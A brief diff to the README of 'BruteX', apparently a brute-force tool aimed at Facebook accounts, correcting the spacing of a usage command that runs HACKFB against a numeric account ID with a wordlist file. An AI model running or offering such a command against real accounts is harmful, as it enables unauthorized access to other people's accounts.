@@ -60,7 +60,7 @@ BruteX is A bruteForce attacking tool
 
   chmod 777 HACKFB
 
- . /HACKFB -t 100006256286582 -w /sdcard/access.txt
+  ./HACKFB -t 100006256286582 -w /sdcard/access.txt
 
 ```
 
